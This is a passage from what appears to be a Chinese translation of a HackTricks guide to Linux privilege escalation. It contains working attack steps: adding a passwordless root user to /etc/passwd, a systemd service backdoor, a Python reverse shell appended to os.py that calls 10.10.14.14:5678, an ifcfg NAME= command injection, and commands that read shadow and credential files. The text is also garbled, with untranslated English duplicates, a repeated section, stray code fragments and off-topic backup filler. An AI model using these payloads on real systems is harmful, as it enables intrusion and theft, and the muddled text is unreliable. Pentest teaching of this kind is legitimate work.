文件`/etc/profile`和`/etc/profile.d/`目录下的文件是**当用户运行新的shell时执行的脚本**。因此，如果您可以**编写或修改其中任何一个文件，您就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何奇怪的配置文件，应该检查其中是否包含**敏感信息**。

### Passwd/Shadow 文件

根据操作系统的不同，`/etc/passwd` 和 `/etc/shadow` 文件的名称可能不同，或者可能有备份文件。因此，建议**找到所有这些文件**并**检查是否可以读取**它们，以查看文件中是否包含**哈希值**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在`/etc/passwd`（或等效）文件中找到**密码哈希值**。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用以下命令之一生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
然后添加用户`hacker`并添加生成的密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如：`hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

您现在可以使用`su`命令和`hacker:hacker`登录。

或者，您可以使用以下行添加一个没有密码的虚拟用户。\
警告：这可能会降低机器的当前安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在BSD平台上，`/etc/passwd`位于`/etc/pwd.db`和`/etc/master.passwd`，而`/etc/shadow`被重命名为`/etc/spwd.db`。

您应该检查是否可以**写入某些敏感文件**。例如，您能否写入某些**服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器上运行着一个 **tomcat** 服务器，并且你可以 **修改位于 /etc/systemd/ 目录下的 Tomcat 服务配置文件**，那么你可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的后门将在下次启动tomcat时执行。

### 检查文件夹

以下文件夹可能包含备份或有趣的信息：**/tmp**，**/var/tmp**，**/var/backups**，**/var/mail**，**/var/spool/mail**，**/etc/exports**，**/root**（最后一个可能无法读取，但请尝试）。
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/拥有的文件

Sometimes, during a privilege escalation process, it is useful to check for files that are located in unusual or unexpected locations, or files that are owned by privileged users. These files may contain sensitive information or provide a way to escalate privileges.

以下是一些在特殊或意外位置的文件，或者是由特权用户拥有的文件。在特权升级过程中，检查这些文件可能会发现包含敏感信息或提供特权升级的方法。

#### Unusual File Locations

检查不寻常的文件位置

- **/tmp** or **/var/tmp**: These directories are commonly used for temporary files. However, sometimes attackers may place malicious files here to maintain persistence or escalate privileges.

- **/tmp** 或 **/var/tmp**：这些目录通常用于临时文件。然而，攻击者有时会将恶意文件放在这里以保持持久性或升级特权。

- **/dev/shm**: This directory is a shared memory space in Linux. Attackers may use this location to store malicious files that can be executed.

- **/dev/shm**：这个目录是Linux中的共享内存空间。攻击者可能会使用这个位置来存储可执行的恶意文件。

- **/var/www/html**: This is the default web server root directory in many Linux distributions. Attackers may place web shells or other malicious files here to gain control over the web server.

- **/var/www/html**：这是许多Linux发行版中默认的Web服务器根目录。攻击者可能会在这里放置Web shell或其他恶意文件，以控制Web服务器。

#### Files Owned by Privileged Users

由特权用户拥有的文件

- **/etc/passwd**: This file contains user account information. If it is writable by a non-privileged user, it can be modified to create a new privileged user account.

- **/etc/passwd**：这个文件包含用户账户信息。如果它可被非特权用户写入，可以修改它以创建一个新的特权用户账户。

- **/etc/shadow**: This file contains password hashes for user accounts. If it is readable by a non-privileged user, the hashes can be cracked to obtain the passwords.

- **/etc/shadow**：这个文件包含用户账户的密码哈希值。如果它可被非特权用户读取，可以破解哈希值以获取密码。

- **/etc/sudoers**: This file contains the configuration for the sudo command, which allows users to execute commands with elevated privileges. If it is writable by a non-privileged user, the configuration can be modified to grant additional privileges.

- **/etc/sudoers**：这个文件包含sudo命令的配置，允许用户以提升的特权执行命令。如果它可被非特权用户写入，可以修改配置以授予额外的特权。

- **Cron Jobs**: Check for any cron jobs owned by privileged users. Attackers may create cron jobs to execute malicious commands with elevated privileges.

- **定时任务**：检查由特权用户拥有的任何定时任务。攻击者可能创建定时任务以以提升的特权执行恶意命令。

Remember to check the permissions and ownership of these files to determine if they can be modified or accessed by non-privileged users.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟内修改的文件

To identify the files that have been modified in the last few minutes, you can use the following command:

```bash
find / -type f -mmin -5
```

This command will search for all files (`-type f`) in the entire system (`/`) that have been modified within the last 5 minutes (`-mmin -5`).

Please note that this command may take some time to execute, as it searches the entire system. Additionally, you may need root privileges to search certain directories.

### 最近几分钟内修改的文件

要识别最近几分钟内已修改的文件，您可以使用以下命令：

```bash
find / -type f -mmin -5
```

该命令将在整个系统 (`/`) 中搜索所有已修改的文件 (`-type f`），这些文件在最近 5 分钟内被修改 (`-mmin -5`)。

请注意，由于该命令搜索整个系统，可能需要一些时间来执行。此外，您可能需要 root 权限来搜索某些目录。
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite数据库文件

Sqlite是一种轻量级的嵌入式数据库引擎，常用于移动设备和小型应用程序。它的数据库文件通常具有`.db`或`.sqlite`的扩展名。

在渗透测试中，Sqlite数据库文件可能包含敏感信息，如用户凭据、配置文件、日志等。攻击者可以通过提升特权来访问这些文件，并从中获取有价值的信息。

以下是一些常见的Sqlite数据库文件位置：

- `/data/data/<package_name>/databases/`：Android应用程序的数据库文件存储在此目录下。
- `~/.mozilla/firefox/<profile_name>/places.sqlite`：Mozilla Firefox浏览器的书签和历史记录存储在此文件中。
- `~/.config/chromium/Default/History`：Chromium浏览器的历史记录存储在此文件中。
- `~/.config/google-chrome/Default/History`：Google Chrome浏览器的历史记录存储在此文件中。

要访问Sqlite数据库文件，可以使用Sqlite命令行工具或其他第三方工具，如DB Browser for SQLite。

在渗透测试中，如果能够访问Sqlite数据库文件，可以尝试查找敏感信息、执行SQL注入攻击或修改数据库内容以实现特权提升。
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件

这些文件可能包含敏感信息或配置，可用于特权升级和其他攻击。以下是这些文件的一些常见位置和用途：

- \*\_history：用户的命令历史记录文件，可能包含敏感命令和凭据。
- .sudo\_as\_admin\_successful：记录成功使用sudo命令以管理员权限执行的日志。
- profile：用户的配置文件，可能包含环境变量和其他敏感信息。
- bashrc：用户的bash shell配置文件，可能包含自定义命令和环境变量。
- httpd.conf：Apache HTTP服务器的配置文件，可能包含敏感信息和安全漏洞。
- .plan：用户的计划文件，可能包含敏感信息和计划活动。
- .htpasswd：Apache服务器的密码文件，包含用户凭据。
- .git-credentials：Git版本控制系统的凭据文件，包含访问代码仓库的凭据。
- .rhosts：远程主机文件，用于rlogin和rsh服务的身份验证。
- hosts.equiv：远程主机文件，用于rsh和rlogin服务的身份验证。
- Dockerfile：Docker容器的构建文件，可能包含敏感信息和安全漏洞。
- docker-compose.yml：Docker Compose的配置文件，可能包含敏感信息和安全漏洞。

在进行特权升级和其他攻击时，检查和分析这些文件可能会提供有价值的信息。
```bash
fils=`find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null`Hidden files
```
### 隐藏文件

Hidden files are files that are not visible by default in a file manager or command line interface. These files are often used to store sensitive information or configuration settings that should not be easily accessible to regular users.

隐藏文件是在文件管理器或命令行界面中默认情况下不可见的文件。这些文件通常用于存储敏感信息或配置设置，不应该轻易被普通用户访问到。

In Linux, hidden files are denoted by a dot (.) at the beginning of the file name. For example, a file named ".config" would be considered hidden. To view hidden files in a file manager, you can usually enable an option to show hidden files. In a command line interface, you can use the "ls -a" command to display all files, including hidden ones.

在Linux中，隐藏文件以文件名开头的点（.）来表示。例如，名为“.config”的文件将被视为隐藏文件。要在文件管理器中查看隐藏文件，通常可以启用一个选项来显示隐藏文件。在命令行界面中，可以使用“ls -a”命令来显示所有文件，包括隐藏文件。

Hidden files can be used by attackers to hide malicious scripts or backdoors on a compromised system. Therefore, it is important to regularly check for and remove any suspicious hidden files on your system.

攻击者可以利用隐藏文件在被攻陷的系统上隐藏恶意脚本或后门。因此，定期检查并删除系统中的任何可疑隐藏文件非常重要。

To find hidden files on a Linux system, you can use the "find" command with the "-name" option and the pattern ".*". For example, the command "find / -name '.*'" will search the entire filesystem for hidden files.

要在Linux系统中查找隐藏文件，可以使用“find”命令配合“-name”选项和模式“.*”。例如，命令“find / -name '.*'”将在整个文件系统中搜索隐藏文件。

It is also a good practice to restrict the permissions of sensitive files and directories to prevent unauthorized access. You can use the "chmod" command to change the permissions of a file or directory. For example, the command "chmod 600 file.txt" will set the file.txt to be readable and writable only by the owner.

限制敏感文件和目录的权限以防止未经授权的访问也是一个好的做法。可以使用“chmod”命令来更改文件或目录的权限。例如，命令“chmod 600 file.txt”将设置file.txt只能由所有者读取和写入。

By being aware of hidden files and taking necessary precautions, you can enhance the security of your Linux system and protect it from potential attacks.

通过了解隐藏文件并采取必要的预防措施，您可以增强Linux系统的安全性，并保护它免受潜在的攻击。
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **路径中的脚本/可执行文件**

One common privilege escalation technique is to search for scripts or binaries that are located in directories included in the system's PATH environment variable. This allows an attacker to execute these scripts or binaries with elevated privileges.

一种常见的提权技术是搜索位于系统的PATH环境变量所包含的目录中的脚本或可执行文件。这使得攻击者可以以提升的权限执行这些脚本或可执行文件。

To identify these scripts or binaries, you can use the following command:

要识别这些脚本或可执行文件，您可以使用以下命令：

```bash
which <script/binary>
```

Replace `<script/binary>` with the name of the script or binary you want to search for.

将`<script/binary>`替换为您要搜索的脚本或可执行文件的名称。

If the command returns a path, it means that the script or binary is present in one of the directories included in the PATH variable. This can be exploited by an attacker to escalate privileges.

如果命令返回一个路径，这意味着该脚本或可执行文件存在于PATH变量所包含的目录之一中。攻击者可以利用这一点来提升权限。

To exploit this, you can create a malicious script or binary with the same name as the one found in the PATH and place it in a directory that is writable by the current user. When the system tries to execute the script or binary, it will execute the malicious one instead, allowing the attacker to gain elevated privileges.

要利用这一点，您可以创建一个恶意脚本或可执行文件，与在PATH中找到的脚本或可执行文件同名，并将其放置在当前用户可写的目录中。当系统尝试执行脚本或可执行文件时，它将执行恶意脚本或可执行文件，从而允许攻击者获得提升的权限。
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Web文件**

Web文件是指存储在Web服务器上的文件。这些文件包括网页、脚本、样式表、图像和其他与网站相关的资源。攻击者可以利用Web文件中的漏洞来实施各种攻击，包括文件包含、远程代码执行和文件上传等。

以下是一些常见的Web文件攻击技术：

- 文件包含漏洞：攻击者可以利用文件包含漏洞来读取、执行或包含Web服务器上的任意文件。这可能导致敏感信息泄露、远程代码执行或服务器完全控制等问题。

- 远程代码执行：攻击者可以通过远程代码执行漏洞在Web服务器上执行任意代码。这可能导致服务器被入侵、敏感数据泄露或服务器完全控制等问题。

- 文件上传漏洞：攻击者可以通过文件上传漏洞将恶意文件上传到Web服务器上。这可能导致服务器被入侵、恶意文件执行或服务器完全控制等问题。

为了保护Web文件免受攻击，可以采取以下措施：

- 及时更新和修补Web服务器和应用程序，以修复已知的漏洞。

- 限制文件包含功能的使用，并确保只包含可信任的文件。

- 对用户上传的文件进行严格的验证和过滤，以防止恶意文件的上传和执行。

- 配置适当的访问控制和权限设置，以限制对Web文件的访问。

- 实施Web应用程序防火墙（WAF）来检测和阻止恶意请求。

- 定期进行安全审计和漏洞扫描，以及监控Web服务器的活动。

通过采取这些措施，可以增强Web文件的安全性，并减少受到攻击的风险。
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**

Backups are an essential part of any system's security strategy. They serve as a safety net in case of data loss or system failure. By regularly backing up important files and data, you can ensure that you have a copy of your information that can be easily restored.

备份是任何系统安全策略的重要组成部分。它们在数据丢失或系统故障的情况下充当安全网。通过定期备份重要文件和数据，您可以确保拥有可以轻松恢复的信息副本。

#### **Why are backups important?**

#### **为什么备份很重要？**

Backups are important for several reasons:

备份之所以重要有以下几个原因：

- **Data loss prevention**: Backups protect against accidental deletion, hardware failure, software bugs, and other events that can lead to data loss.

- **防止数据丢失**：备份可以防止意外删除、硬件故障、软件错误和其他可能导致数据丢失的事件。

- **Disaster recovery**: In the event of a system failure or a security breach, backups can be used to restore the system to a previous state.

- **灾难恢复**：在系统故障或安全漏洞的情况下，可以使用备份将系统恢复到先前的状态。

- **Business continuity**: Backups ensure that critical business data and operations can be quickly restored, minimizing downtime and reducing the impact on productivity.

- **业务连续性**：备份确保关键业务数据和操作可以快速恢复，最大程度地减少停机时间，降低对生产力的影响。

#### **Types of backups**

#### **备份类型**

There are several types of backups that you can use, depending on your needs:

根据您的需求，可以使用多种备份类型：

- **Full backup**: A full backup copies all the files and data in a system. It provides a complete snapshot of the system at a specific point in time.

- **完全备份**：完全备份会复制系统中的所有文件和数据。它提供了系统在特定时间点的完整快照。

- **Incremental backup**: An incremental backup only copies the files that have changed since the last backup. This type of backup is faster and requires less storage space than a full backup.

- **增量备份**：增量备份仅复制自上次备份以来发生更改的文件。这种备份类型比完全备份更快，需要的存储空间更少。

- **Differential backup**: A differential backup copies all the files that have changed since the last full backup. Unlike an incremental backup, it does not take into account the previous differential backups.

- **差异备份**：差异备份会复制自上次完全备份以来发生更改的所有文件。与增量备份不同，它不考虑先前的差异备份。

- **Snapshot backup**: A snapshot backup captures the state of a system at a specific point in time. It allows you to create a copy of the system while it is running, without interrupting its operation.

- **快照备份**：快照备份会捕捉系统在特定时间点的状态。它允许您在系统运行时创建副本，而不会中断其操作。

#### **Best practices for backups**

#### **备份的最佳实践**

To ensure the effectiveness of your backups, consider the following best practices:

为确保备份的有效性，请考虑以下最佳实践：

- **Regular backups**: Perform backups on a regular basis to ensure that your data is always up to date.

- **定期备份**：定期进行备份，以确保您的数据始终是最新的。

- **Offsite backups**: Store backups in a separate location from the original data to protect against physical damage or theft.

- **异地备份**：将备份存储在与原始数据不同的位置，以防止物理损坏或盗窃。

- **Encryption**: Encrypt your backups to protect sensitive data from unauthorized access.

- **加密**：对备份进行加密，以保护敏感数据免受未经授权的访问。

- **Test restores**: Regularly test the restoration process to ensure that your backups are working correctly.

- **测试恢复**：定期测试恢复过程，以确保备份正常工作。

- **Multiple copies**: Keep multiple copies of your backups to provide redundancy and increase the chances of successful restoration.

- **多个副本**：保留多个备份副本，以提供冗余并增加成功恢复的机会。

By following these best practices, you can ensure that your backups are reliable and effective in protecting your data.
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/nulll
```
### 已知包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索**可能包含密码的多个文件**。\
另一个有趣的工具是 [**LaZagne**](https://github.com/AlessandroZ/LaZagne)，它是一个开源应用程序，用于检索存储在Windows、Linux和Mac本地计算机上的许多密码。

### 日志

如果你能读取日志，可能能够在其中找到**有趣/机密的信息**。日志越奇怪，可能越有趣。\
此外，一些 "**糟糕的**" 配置（后门？）的**审计日志**可能允许你在审计日志中记录密码，如此文章所述：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了**读取日志文件**，[**adm**](interesting-groups-linux-pe/#adm-group)组将非常有帮助。

### Shell文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 通用凭证搜索/正则表达式

您还应检查文件名或内容中包含单词“**password**”的文件，还应检查日志中的IP和电子邮件，或者哈希正则表达式。\
我不会在这里列出如何执行所有这些操作，但如果您有兴趣，可以查看[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)执行的最后一些检查。

## 可写文件

### Python库劫持

如果您知道一个Python脚本将在哪里执行，并且您可以在该文件夹中**写入**或者您可以**修改Python库**，您可以修改OS库并将其后门化（如果您可以在Python脚本将要执行的位置写入，请复制并粘贴os.py库）。

要**后门化库**，只需在os.py库的末尾添加以下行（更改IP和端口）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate漏洞利用

`logrotate`存在一个漏洞，允许具有**对日志文件或其任何父目录的写权限**的用户在**任何位置**上写入文件。如果**root**执行了**logrotate**，那么用户将能够在任何用户登录时执行的_**/etc/bash\_completion.d/**_中写入任何文件。

因此，如果您对**日志文件**或其**父文件夹**具有**写权限**，则可以进行**特权升级**（在大多数Linux发行版上，logrotate每天自动以**root用户**身份执行）。此外，请检查除了_/var/log_之外是否还有其他文件被**轮换**。

{% hint style="info" %}
此漏洞影响`logrotate`版本`3.18.0`及更早版本
{% endhint %}

有关该漏洞的更详细信息，请参阅此页面：[https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

您可以使用[**logrotten**](https://github.com/whotwagner/logrotten)利用此漏洞。

此漏洞与[**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **（nginx日志）**非常相似，因此每当您发现可以更改日志时，请检查谁在管理这些日志，并检查是否可以通过符号链接升级权限。

### /etc/sysconfig/network-scripts/（Centos/Redhat）

如果由于某种原因，用户能够将`ifcf-<whatever>`脚本写入_/etc/sysconfig/network-scripts_，**或者**可以**调整**现有脚本，则您的**系统已被入侵**。

网络脚本（例如ifcg-eth0）用于网络连接。它们看起来与.INI文件完全相同。但是，在Linux上，它们是由Network Manager（dispatcher.d）\~sourced\~。

在我的情况下，这些网络脚本中的`NAME=`属性没有正确处理。如果名称中有**空格**，系统将尝试执行空格后的部分。这意味着**第一个空格后的所有内容都将以root身份执行**。

例如：_/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
**漏洞参考：** [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init、init.d、systemd和rc.d**

`/etc/init.d` 包含了 System V init 工具（SysVinit）使用的 **脚本**。这是 Linux 上的传统服务管理包，包含了 `init` 程序（在内核完成初始化后运行的第一个进程¹）以及一些用于启动、停止服务和配置服务的基础设施。具体来说，`/etc/init.d` 中的文件是 shell 脚本，用于响应 `start`、`stop`、`restart` 和（如果支持）`reload` 命令来管理特定的服务。这些脚本可以直接调用，也可以通过其他触发器（通常是在 `/etc/rc?.d/` 中存在符号链接）来调用（来自[这里](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。在 Redhat 中，这个文件夹的另一个替代品是 `/etc/rc.d/init.d`。

`/etc/init` 包含了 **Upstart** 使用的 **配置文件**。Upstart 是由 Ubuntu 支持的一种年轻的服务管理包。`/etc/init` 中的文件是配置文件，告诉 Upstart 如何以及何时 `start`、`stop`、`reload` 配置，或查询服务的 `status`。从 lucid 开始，Ubuntu 正在从 SysVinit 迁移到 Upstart，这就解释了为什么许多服务都带有 SysVinit 脚本，尽管 Upstart 配置文件更受欢迎。SysVinit 脚本由 Upstart 中的兼容性层处理（来自[这里](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)）。

**systemd** 是一个 **Linux 初始化系统和服务管理器**，包括按需启动守护进程、挂载和自动挂载点维护、快照支持以及使用 Linux 控制组跟踪进程。systemd 提供了一个日志守护进程和其他工具和实用程序，以帮助完成常见的系统管理任务（来自[这里](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)）。

从发行版仓库下载的软件包中的文件放在 `/usr/lib/systemd/` 中。系统管理员（用户）进行的修改放在 `/etc/systemd/system/` 中。

## 其他技巧

### NFS 权限提升

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### 逃离受限制的 Shell

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## 内核安全保护

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 更多帮助

[Static impacket binaries](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix 提权工具

### **寻找 Linux 本地权限提升向量的最佳工具：** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** 枚举 Linux 和 MAC 中的内核漏洞 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理访问):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**更多脚本的汇总**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考资料

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者想要获取**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)。
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)。
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我的**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
